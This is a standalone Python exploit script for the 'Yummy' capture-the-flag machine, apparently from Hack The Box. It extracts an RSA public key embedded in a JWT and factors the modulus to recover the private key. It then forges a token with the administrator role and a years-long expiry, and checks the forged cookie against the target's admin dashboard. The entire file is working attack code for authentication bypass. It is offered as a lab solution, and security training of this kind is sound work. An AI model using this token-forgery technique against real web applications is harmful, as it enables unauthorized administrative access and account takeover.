#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy
from datetime import datetime, timedelta, timezone
import jwt
import requests
import argparse
import sys
import json


def parse_arguments():
    """
    Get user flags
    """
    parser = argparse.ArgumentParser(description="Creates a JWT for 'HTB Yummy' machine.")
    
    parser.add_argument("-t", "--token", required=True, type=str, help="Jason Web Token extracted from 'HTB Yummy'.")
    parser.add_argument("--check-cookie", action="store_true", help="Check if generated cookie works.")
    
    return parser.parse_args()


def get_numbers_from_original_token(token):
    # Decode the JWT token
    try:
        # Decode without verifying the signature (just for extracting values)
        headers = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})

        # Print the headers and payload
        print(70*"=")
        print(25*' ' + "Original JWT Info")
        print(70*"=")
        print("Header:")
        print(json.dumps(headers, indent=2))
        print("\nPayload:")
        print(json.dumps(payload, indent=2))
        
        # Extract the "n" and "e" value from JWT (if available)
        jwk = payload.get('jwk')
        if jwk:
            return int(jwk.get('n')), int(jwk.get('e'))
        else:
            print("[-] 'n' not found in token.")
            sys.exit(1)

    except jwt.ExpiredSignatureError:
        print("[-] The token has expired.")
    except jwt.InvalidTokenError:
        print("[-] Invalid token.")
    sys.exit(1)


def get_numbers(token, n, e):
    factors = sympy.factorint(n)
    for factor, exponent in factors.items():
        # Find numbers
        print(f"[+] Factor: {factor}, exponent: {exponent}")
        p, q = 0, 0
        if len(factors) == 2:
            p, q = factors.keys()
        print(f"[+] Found numbers: p = {p}, q = {q}")
        phi_n = (p -1)*(q -1)
        d = pow(e,-1, phi_n)
        key_data ={'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
        key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
        # Generate the key new with the numbers
        private_key_bytes = key.export_key()

        private_key = serialization.load_pem_private_key(
                                    private_key_bytes,
                                    password=None,
                                    backend=default_backend()
                                    )
        public_key = private_key.public_key()
        # Modify original token data
        original_token_data = jwt.decode(token, public_key, algorithms=["RS256"])
        original_token_data["role"]="administrator"
        original_token_data["exp"]=int((datetime.now(timezone.utc)+ timedelta(hours=3650)).timestamp())
        # Forge the new token
        new_jwt_token = jwt.encode(original_token_data, private_key, algorithm='RS256')
        return new_jwt_token


def check_if_cookie_works(jwt_token):
    url = 'http://yummy.htb/admindashboard'
    cookies = {'X-AUTH-Token' : jwt_token}
    # Make the request
    r = requests.get(url, cookies=cookies, allow_redirects=False)
    if r.status_code != 200:
        print(f"[-] Invalid status code {r.status_code!r}")
        return
    if '/login' in r.text:
        print("[-] Cookie generated does not seems to work.")
        return
    print(f"[+] JWT seems to work in {url!r}!")


def main()->None:
    # Get token from user
    args: argparse.Namespace = parse_arguments()
    # Get 'n' and 'e' from JWT obtained from 'HTB Yummy' machine
    n, e = get_numbers_from_original_token(args.token)
    # Modify original token
    new_token = get_numbers(args.token, n, e)
    # Print the result
    print(f"[+] Generated JWT token:\n\n{new_token}\n")
    # Check if the cookie works sending it to the target machine
    check_if_cookie_works(new_token)


if __name__ == "__main__":
    main()
